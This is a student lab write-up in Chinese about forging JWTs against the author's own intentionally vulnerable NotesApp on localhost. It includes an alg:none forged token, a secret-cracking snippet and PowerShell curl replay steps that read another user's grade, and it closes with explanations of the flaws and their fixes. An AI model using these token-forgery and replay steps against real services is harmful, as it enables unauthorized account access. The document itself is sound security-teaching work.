# 第六课课堂实验：伪造 JWT（Forge a token）学习说明

本目录记录 2026-10-29 在本人 NotesApp 上完整跑通第六课课堂实验的过程与证据。英文交付版见 [README.md](README.md)，四行结论见 [finding.txt](finding.txt)。实验对象只有本机 `https://localhost` 的克隆，没有接触任何其他主机或账号。

## 一、实验要解决的问题

HTTP 本身没有记忆：登录之后，下一个请求服务器又不知道你是谁。第六课给了两种办法：

- **Session**：服务器存一张表，浏览器只拿一个编号；编号本身不说明身份。
- **Token（JWT）**：身份直接写在凭证上，靠签名防止篡改。

本实验攻击的是第二种：如果服务器检查凭证的方式有问题，凭证里写什么，服务器就信什么。

## 二、先看懂 JWT 的三段

登录 alice 后，页面源码里会渲染出她的令牌。这次实际取到的：

```text
header   : {"alg": "HS256", "typ": "JWT"}
payload  : {"user_id": 6, "username": "alice", "role": "student"}
signature: （第三段，Base64url 编码的 HMAC-SHA-256 值）
```

三段用两个点号连接：`header.payload.signature`。

要点：

- 前两段只是 **Base64url 编码**，不是加密。任何人拿到令牌都能直接读出 `role`。
- 第三段是服务器用密钥对前两段算出的 HMAC。**密钥不在令牌里**，所以正常情况下改一个字符，签名就对不上。
- `alg` 字段告诉服务器“我用的是哪种签名算法”。问题就出在这里：这个字段是**令牌自己写的**。

## 三、实验一：把签名栏留空（alg:none）

思路：既然头部是我写的，我就写 `"alg": "none"`，再把签名留空，等于告诉服务器“这张凭证不用检查”。

构造出的令牌以点号结尾（最后一段为空）：

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjo5OTk5LCJ1c2VybmFtZSI6ImF0dGFja2VyIiwicm9sZSI6InRlYWNoZXIifQ.
```

请求：

```powershell
# 这次用的令牌已保存在 evidence\forged-token.txt
$forged = (Get-Content 'D:\AAAdile\Work\Cybersecurity\Assignments\Session06\Lab\evidence\forged-token.txt' -Raw).Trim()
curl.exe --noproxy "*" -k -H "Authorization: Bearer $forged" https://localhost/api/notes/3
```

结果：**200 OK**，返回了 note 3 —— 属于 bob 的成绩：

```json
{"id": 3, "student": "bob", "class_name": "Mathematics", "grade": 12.6, "comment": "Solid work, keep it up."}
```

同一地址如果不带 `Authorization` 头，10 月 27 日的日志是 `401`；本次运行里空令牌也返回 `401`。所以 200 是令牌带来的，不是接口本来就不设防。

## 四、实验二：签名是真的，密钥被猜出来了

课件把 Part 2 写成一个**假设**：假如服务器改成拒绝 `none`，第一招就失效。但签名强度取决于**密钥**，NotesApp 用的是 `s3cr3t`。

注意：本机这台服务器并没有真的拒绝 `none`。下面的破解和重签仍然是在同一台仍然接受 `none` 的服务器上完成的；“只拒绝 none 挡不住”是从签名有效推出来的结论，不是在拒绝 `none` 的服务器上实测的。

手上的材料：alice 的真实令牌（有正确签名）+ 课程公开的 15 个候选词。做法是逐个候选词做 HMAC-SHA-256，看哪个能重算出同一个签名。

```python
sig = b64(hmac.new(word.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
if sig == target_sig:   # 猜中
```

实测结果：

| 项目 | 结果 |
| --- | --- |
| 密钥 | `s3cr3t` |
| 第几个候选 | 第 8 个（共 15 个） |
| 耗时 | 约 53 微秒 |
| 纯 Python 速率 | 约 15 万次/秒 |

拿到密钥后，重新签发一张 `"role": "teacher"` 的 HS256 令牌，再请求同一个接口：**200 OK**，还是 bob 的 12.6。

关键区别：

- 第一张令牌**没有签名**，靠服务器“不检查”混过去；
- 第二张令牌**签名完全正确**，只有身份是编的。因此如果服务器只拒绝 `none`，这张令牌仍会被接受——这是从签名有效推出的结论，本次没有在拒绝 `none` 的服务器上验证。

## 五、为什么服务器会信：代码位置

`NoteApp/web/app.py`：

- `verify_jwt()`（约第 120 行）：从令牌头部读 `alg`；`alg == "none"` 时**直接返回 payload**，不校验签名。文件注释里写明这是故意留下的 flaw #4。
- `make_jwt()`（约第 111 行）：用 `JWT_SECRET` 做 HMAC-SHA-256。该值来自 `docker-compose.yml` 的 `JWT_SECRET: s3cr3t`。
- `current_identity()`（约第 149 行）：只要 `Authorization: Bearer` 能解析出身份就采用，不区分这份身份是登录发的还是伪造的。
- `api_notes()`（约第 259 行）：按 id 查 note，**不检查这条 note 是否属于当前用户**（flaw #7，IDOR，另一课的内容）。

## 六、下一课要做的三个修复

课件把修复拆成三条，缺一不可：

1. **拒绝 `none`**：没有签名的令牌一律无效。
2. **固定算法（pin the algorithm）**：服务器只接受 HS256，令牌无权决定校验方式。
3. **长随机密钥**：`s3cr3t` 是 6 个字符的字典词；HS256 的密钥至少 256 位（32 个随机字节，十六进制 64 个字符）。注意“把短词重复到 64 个字符”并不等于 256 位随机强度。

本次**没有改代码**，按课件要求“今天只破，不修”。`NoteApp` 的 `git status` 仍为干净。

## 七、和 10 月 27 日那次的关系

10 月 27 日课上，我的命令历史以伪造令牌的 `curl` 结束，该历史文件的最后写入时间是本地 09:39:23；服务器在同一秒记录了一次 `200`、158 字节，之前 09:38:52（本地）的一次无令牌请求是 `401`。

应用和 nginx 日志**都不记录 `Authorization` 头**，所以单看日志不能证明发出去的是哪种令牌；时间戳与命令历史吻合，且 158 字节正好等于 note 3 的 JSON 长度，因此**很可能** Part 1 当时已经成功，但响应体没有保存。

Part 2 当时没有做，也没有任何交付。原始日志两行保留在 [evidence/previous-attempt-20261027.txt](evidence/previous-attempt-20261027.txt)；上面的完整实验是 10 月 29 日重跑的。

### 关于实验前的预测

老师要求两部分开始前先写下 Yes/No 和理由。本目录**没有**这样的记录：命令历史里那次尝试前后只有地址探测、拼接令牌和 `curl`，没有预测内容；10 月 29 日运行前也没有写下预测。这里如实记为缺失，不事后补写——事后写的预测不算预测。

老师页面的 “What you hand in” 只列了 finding，所以这不改变交付内容；但流程上确实少做了这一步。

## 八、自测问题

1. JWT 的 payload 是加密的吗？为什么“能读”不等于“能改”？
2. 服务器为什么会信任 `alg: none`？正确的做法是由谁决定算法？
3. 为什么“只拒绝 none”不够？第二张令牌和第一张令牌的本质区别是什么？
4. `s3cr3t` 被字典秒破，说明密钥强度取决于什么？长度和随机性各起什么作用？
5. 本实验里还有哪个漏洞和签名无关？它为什么会让“读到别人的成绩”更容易？

## 九、文件清单与复现

```text
Lab/
├── README.md                 英文交付说明（方法、结果、证据索引、核验）
├── README_STUDY.zh-CN.md     本文件
├── finding.txt               四行交付结论
├── verification.json         15 项自动核对 + 全部证据的 SHA-256
├── evidence/                 令牌、请求头、响应体、破解结果、服务端日志
└── scripts/                  crack.py（猜密钥）、sign.py（签发令牌）
```

复现步骤（可直接粘贴；脚本在 `Lab\scripts`，不需要先 cd 到 Lab）：

```powershell
# 1. 起容器（在 NoteApp 目录，沿用第五课的 HTTPS 覆盖层）
Set-Location 'D:\AAAdile\Work\Cybersecurity\NoteApp'
docker compose -p noteapp -f docker-compose.yml -f compose.windows.yml -f docker-compose.https.yml up -d --wait

# 2. 取 alice 的真实令牌：登录 https://localhost 后打开 /dashboard，
#    在页面源码里找 const TOKEN = "..."，把那一行令牌存到下面的文件
$tokenFile = "$env:TEMP\alice-token.txt"

# 3. 课程词表（也可以直接用 Lab\evidence\jwt-secrets.txt）
$wordlist = "$env:TEMP\jwt-secrets.txt"
curl.exe --noproxy "*" -s -o $wordlist https://kristenpire.github.io/epita-security-labs/class6/assets/jwt-secrets.txt

# 4. 猜密钥 -> 签发 teacher 令牌 -> 重放
$lab = 'D:\AAAdile\Work\Cybersecurity\Assignments\Session06\Lab'
python "$lab\scripts\crack.py" $tokenFile $wordlist "$env:TEMP\crack-result.json"
$secret = (Get-Content "$env:TEMP\crack-result.json" -Raw | ConvertFrom-Json).secret
python "$lab\scripts\sign.py" $secret "$env:TEMP\signed-token.txt"
$signed = (Get-Content "$env:TEMP\signed-token.txt" -Raw).Trim()
curl.exe --noproxy "*" -k -H "Authorization: Bearer $signed" https://localhost/api/notes/3
```

`crack.py` 需要 alice 的真实令牌才有意义；`sign.py` 的密钥从 `crack-result.json` 读取，脚本里没有写死。第 4 步的 Python 部分已用本目录现有证据离线复跑：`crack.py` 仍输出 `s3cr3t`（第 8 个候选），`sign.py` 生成 155 字符、三段式的令牌；容器与 `curl` 步骤在 10 月 29 日实际跑通过。

### 与老师原文的差异

- 原文用 `docker compose up -d` + `http://localhost:8080`；本机沿用第五课的 HTTPS 覆盖层，走 `https://localhost`（443）。
- 原文要求两人一组；这次是个人在自己克隆上执行。
- 原文说词表放在 clone 旁边；这里放在 `evidence\jwt-secrets.txt`，文件内容就是课程那份 15 词表。
- 原文最后的 Cleanup（`docker compose down`）没有执行；容器是直接留着的，数据库卷没有删除，`git` 也没有任何改动。
